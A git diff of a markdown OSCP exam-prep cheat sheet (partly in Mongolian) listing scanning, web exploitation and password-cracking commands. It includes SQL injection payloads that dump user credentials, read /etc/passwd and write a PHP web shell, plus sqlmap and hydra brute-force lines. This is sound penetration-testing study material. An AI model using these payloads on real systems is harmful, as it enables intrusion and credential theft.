@@ -4,7 +4,6 @@ published: true
 # OSCP Prep by fg0x0
 
 ### Scanning
-
 ```
 rustscan -a 192.168.1.1 --ulimit 5000
 sudo nmap -sV -T4 -p- -O -oN nmap bravery
@@ -14,19 +13,17 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 -O identify Operating System
 -oN output to file, in our case it’s called nmap
 ```
-
-
+<br>
 ### Web Exploitation
-
+<br>
 ##### Directory Bruteforcing
-
-
+<br>
 ##### Nikto
 
 ```
 nikto -h $HOST
 ```
-
+<br>
 ##### SQL Injection
 
 ```
@@ -52,7 +49,6 @@ nikto -h $HOST
 
 ' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - ( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
 
-
 File унших ( Read File )
 
 ' union select 1,2,3,load_file('/etc/passwd'),5,6,7,8--
@@ -68,7 +64,7 @@ PHP cmd shell хуулах
 
 ' union select 1,2,3,"<?php system($_GET['cmd'])?>",5,6,7,8 into outfile '/var/www/rev-shell.php'--
 ```
-
+<br>
 ##### Sqlmap ( Database )
 
 ```
@@ -77,15 +73,15 @@ sqlmap -r sql.txt -D Staff --dump
 sqlmap -r sql.txt -D users --dump
 
 ```
-
+<br>
 ### Password Cracking
-
+<br>
 ##### Hydra
 
 ```
 hydra -L users.txt -P passwords.txt ssh://192.168.56.142:22 -t 10 -I
 ```
-
+<br>
 ##### Hashcat
 
 
